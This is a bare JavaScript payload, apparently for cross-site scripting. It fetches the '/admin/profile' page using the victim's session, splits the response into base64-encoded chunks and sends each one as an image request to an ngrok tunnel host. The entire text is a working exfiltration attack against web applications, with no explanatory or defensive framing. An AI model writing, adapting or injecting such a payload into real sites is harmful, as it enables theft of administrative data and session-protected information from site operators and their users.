fetch("/admin/profile")
.then(r=>r.text())
.then(d=>{
let s=3000,i=0
function x(){
if(i>=d.length)return
(new Image()).src="https://7368-2402-800-61c7-539d-60ad-28f0-6942-5ea2.ngrok-free.app/?i="+i+"&d="+btoa(d.slice(i,i+s))
i+=s
setTimeout(x,150)
}
x()
})
